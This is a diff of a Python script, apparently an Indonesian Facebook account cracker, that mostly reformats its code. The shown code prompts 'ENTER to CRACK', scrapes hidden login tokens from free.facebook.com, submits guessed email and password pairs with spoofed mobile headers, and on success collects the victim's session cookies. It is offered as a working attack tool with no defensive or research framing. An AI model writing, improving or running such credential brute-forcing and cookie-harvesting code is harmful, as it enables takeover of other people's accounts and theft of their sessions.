@@ -179,7 +179,7 @@ hr = calendar.day_name[my_date.weekday()]
 tanggal = ("%s-%s-%s-%s"%(hr, ho, op, ta))
 tgl = ("%s %s %s"%(ho, op, ta))
 bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
-	
+
 def brute():
         raw_input('\nENTER to CRACK')
         try:
@@ -219,14 +219,7 @@ def crack(uid, pwx):
 			ses = requests.Session()
 			ses.headers.update({"Host":'free.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://free.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
 			p = ses.get('https://free.facebook.com/login/?email='+uid).text
-			dataa ={
-'lsd':re.search('name="lsd" value="(.*?)"', str(p)).group(1),
-'jazoest':re.search('name="jazoest" value="(.*?)"', str(p)).group(1),
-'m_ts':re.search('name="m_ts" value="(.*?)"', str(p)).group(1),
-'li':re.search('name="li" value="(.*?)"', str(p)).group(1),
-'email':idf,
-'pass':pw
-}
+			dataa ={'lsd':re.search('name="lsd" value="(.*?)"', str(p)).group(1),'jazoest':re.search('name="jazoest" value="(.*?)"', str(p)).group(1),'m_ts':re.search('name="m_ts" value="(.*?)"', str(p)).group(1),'li':re.search('name="li" value="(.*?)"', str(p)).group(1),'email':idf,'pass':pw}
 			po = ses.post('https://free.facebook.com/login/device-based/regular/login/?shbl=1&refsrc=deprecated',data=dataa,allow_redirects=False)
 			if "c_user" in ses.cookies.get_dict().keys():
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")
@@ -244,6 +237,5 @@ def crack(uid, pwx):
 
 		loop+=1
 
-if __name__ == "__main__":
+if __name__=='__main__':
 	brute()
-	
